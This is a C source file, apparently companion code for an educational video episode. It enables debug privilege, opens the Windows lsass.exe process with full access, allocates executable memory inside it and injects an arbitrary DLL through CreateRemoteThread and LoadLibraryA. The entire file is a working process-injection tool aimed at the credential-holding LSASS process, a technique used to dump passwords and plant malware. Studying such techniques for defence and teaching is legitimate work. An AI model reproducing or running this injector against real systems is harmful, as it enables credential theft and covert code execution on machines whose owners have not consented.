// Dark Mode Episode 002
// https://www.youtube.com/playlist?list=PLlaINRtydtNUwkwdmCBNtkwgVRda8Ya_G
// Joseph Ryan Ries
#pragma comment(lib, "advapi32.lib")
#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
int main(int argc, char* argv[])
{
	HANDLE CurrentProcessTokenHandle = INVALID_HANDLE_VALUE;
	LUID Luid = { 0 };
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };
	PROCESSENTRY32 ProcessEnumerator = { .dwSize = sizeof(PROCESSENTRY32) };
	HANDLE ProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	HANDLE TargetProcessHandle = INVALID_HANDLE_VALUE;
	void* RemoteMemory = NULL;
  
  if (argc != 2)
  {
    printf("Usage: install \"c:\\path\\to\\my.dll\"\n");
    return(1);
  }

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentProcessTokenHandle);
	LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &Luid);
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Luid = Luid;
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(CurrentProcessTokenHandle, FALSE,	&TokenPrivileges,	0, (PTOKEN_PRIVILEGES)NULL,	(PDWORD)NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		printf("[-] Failed to enabled debug privilege!\n");
		return(1);
	}
	printf("[+] Debug privilege enabled.\n");
	Process32First(ProcessSnapshot, &ProcessEnumerator);
	while (Process32Next(ProcessSnapshot, &ProcessEnumerator) == TRUE)
	{
		if (_stricmp(ProcessEnumerator.szExeFile, "lsass.exe") == 0)
		{
			printf("[+] lsass process found with PID %lu.\n", ProcessEnumerator.th32ProcessID);
			TargetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessEnumerator.th32ProcessID);
			break;			
		}
	}
	if (TargetProcessHandle == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to locate or open lsass process!\n");
		return(1);
	}
	// will allocate at least 1 page of memory, initialized to zero.
	RemoteMemory = VirtualAllocEx(TargetProcessHandle, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (RemoteMemory == NULL)
	{
		printf("[-] Failed to allocate remote memory! 0x%08lx\n", GetLastError());
		return(1);
	}
	printf("[+] Memory allocated in remote process.\n");
	if (WriteProcessMemory(TargetProcessHandle, RemoteMemory, argv[1], strlen(argv[1]), 0) == 0)
	{
		printf("[-] Failed to write remote process memory! 0x%08lx\n", GetLastError());
		return(1);
	}
	printf("[+] Remote process memory written.\n");
	if (CreateRemoteThread(TargetProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, RemoteMemory, 0, NULL) == NULL)
	{
		printf("[-] Failed to create remote thread! 0x%08lx\n", GetLastError());
		return(1);
	}
	printf("[+] Remote thread created.\n");
  



  
  return(0);
}
